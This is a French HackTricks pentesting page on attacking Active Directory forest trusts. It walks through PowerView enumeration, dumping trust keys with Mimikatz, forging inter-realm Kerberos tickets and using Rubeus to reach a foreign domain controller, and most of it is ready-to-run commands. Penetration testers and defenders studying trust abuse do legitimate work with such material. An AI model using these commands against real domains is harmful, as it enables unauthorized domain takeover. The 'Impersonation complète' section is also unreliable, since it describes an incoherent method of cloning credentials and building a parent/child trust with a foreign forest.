# Domaine forestier externe - Unidirectionnel (entrant) ou bidirectionnel

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Dans ce scénario, un domaine externe vous fait confiance (ou les deux se font confiance), vous pouvez donc obtenir un certain type d'accès dessus.

## Énumération

Tout d'abord, vous devez **énumérer** la **confiance** :
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname           
-----------           
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
                          DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned 
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Dans l'énumération précédente, il a été découvert que l'utilisateur **`crossuser`** est membre du groupe **`External Admins`** qui a un accès **Admin** dans le **DC du domaine externe**.

## Accès initial

Si vous n'avez trouvé **aucun accès spécial** de votre utilisateur dans l'autre domaine, vous pouvez toujours revenir à la méthodologie AD et essayer de **privesc à partir d'un utilisateur non privilégié** (comme le kerberoasting par exemple) :

Vous pouvez utiliser les fonctions **Powerview** pour **énumérer** l'**autre domaine** en utilisant le paramètre `-Domain` comme ceci :
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## Impersonation

### Connexion

En utilisant une méthode régulière avec les identifiants de l'utilisateur qui a accès au domaine externe, vous devriez être en mesure d'accéder :
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Abus de l'historique SID

Vous pouvez également abuser de l'[**historique SID**](sid-history-injection.md) à travers une confiance de forêt.

Si un utilisateur est migré **d'une forêt à une autre** et que **la filtration SID n'est pas activée**, il devient possible d'**ajouter un SID de l'autre forêt**, et ce **SID** sera **ajouté** au **jeton de l'utilisateur** lors de l'authentification **à travers la confiance**.

{% hint style="warning" %}
Pour rappel, vous pouvez obtenir la clé de signature avec
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Vous pourriez **signer avec** la clé **de confiance** un **TGT se faisant passer pour** l'utilisateur du domaine actuel.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Impersonation complète de l'utilisateur

---

#### Description

Dans cette méthode, nous allons créer un utilisateur dans notre domaine qui aura les mêmes informations d'identification que l'utilisateur que nous voulons impersonner. Ensuite, nous allons configurer une relation d'approbation unidirectionnelle entre notre domaine et le domaine cible. Enfin, nous allons utiliser l'utilisateur que nous avons créé pour nous connecter au domaine cible.

#### Étapes

1. Créez un nouvel utilisateur dans votre domaine avec les mêmes informations d'identification que l'utilisateur que vous voulez impersonner.

2. Configurez une relation d'approbation unidirectionnelle entre votre domaine et le domaine cible. La relation doit être configurée de manière à ce que votre domaine soit le domaine parent et le domaine cible soit le domaine enfant.

3. Utilisez l'utilisateur que vous avez créé pour vous connecter au domaine cible. Vous devriez maintenant avoir un accès complet en tant qu'utilisateur cible.

#### Remarques

- Cette méthode nécessite des privilèges d'administration sur votre domaine et sur le domaine cible.

- Cette méthode peut être détectée en surveillant les événements d'audit sur le domaine cible.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live).
* **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
